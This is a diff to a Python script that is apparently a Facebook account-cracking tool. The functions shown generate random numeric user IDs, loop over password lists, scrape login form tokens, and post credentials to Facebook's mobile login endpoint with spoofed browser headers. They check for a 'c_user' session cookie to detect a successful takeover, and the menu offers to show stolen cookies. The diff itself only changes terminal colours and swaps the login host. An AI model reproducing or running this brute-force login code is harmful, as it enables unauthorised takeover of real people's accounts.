@@ -644,7 +644,7 @@ def SUMON2():
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
     clear()
-    print("                CHOOSE METHOD                       ")
+    print("\033[1;32m                CHOOSE METHOD                       ")
     print(f'{yellow}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print("\033[1;32m[1] METHOD (1) ")
     print("\033[1;32m[2] METHOD (2) ")
@@ -653,7 +653,7 @@ def SUMON2():
     print("\033[1;32m[5] METHOD (5) ")
     print("\033[1;32m[6] METHOD (6) ")
     linex()
-    SUMONfire = input("[+] [CHOOSE] :- ")
+    SUMONfire = input("\033[1;32m[+] [CHOOSE] :- ")
     linex()
     print("\033[1;32m[?] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -1365,7 +1365,7 @@ def p(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
+            free_fb = Session.get('https://P.facebook.com').text
             data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
 'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
 'try_number': '0',
@@ -1389,7 +1389,7 @@ def p(uid,pwx,tl):
 'a': '',
 '__user': '0',
 '_fb_noscript': 'true'}
-            headers ={'Host': 'm.facebook.com',
+            headers ={'Host': 'P.facebook.com',
 'content-length': '510',
 'sec-ch-ua': '"Not.A/Brand";v="20", "Chromium";v="112", "Google Chrome";v="110"',
 'sec-ch-ua-mobile': '?1',
@@ -1404,16 +1404,16 @@ def p(uid,pwx,tl):
 'sec-ch-prefers-color-scheme': 'light',
 'sec-ch-ua-platform': '"Android"',
 'accept': '*/*',
-'origin': 'https://m.facebook.com',
+'origin': 'https://P.facebook.com',
 'sec-fetch-site': 'same-origin',
 'sec-fetch-mode': 'cors',
 'sec-fetch-dest': 'empty',
-'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=669323149842984&kid_directed_site=0&app_id=669323149842984&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fscope%3Demail%26response_type%3Dcode%26client_id%3D669323149842984%26redirect_uri%3Dhttps%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Ffacebook-login%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Faccount%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dcd6cd158-ccf7-4eaa-8a93-e1cf23fdbf56%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmember-m.daraz.com.bd%2Fuser%2Ffacebook-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Faccount%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+'referer': 'https://P.facebook.com/login.php?skip_api_login=1&api_key=669323149842984&kid_directed_site=0&app_id=669323149842984&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fscope%3Demail%26response_type%3Dcode%26client_id%3D669323149842984%26redirect_uri%3Dhttps%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Ffacebook-login%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Faccount%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dcd6cd158-ccf7-4eaa-8a93-e1cf23fdbf56%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmember-m.daraz.com.bd%2Fuser%2Ffacebook-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Faccount%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
 'accept-encoding': 'gzip, deflate, br',
 'accept-language': 'zh-CN;q=0.8,zh;q=0.9',
 'x-response-format': 'JSONStream'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/"
+            url = "https://P.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
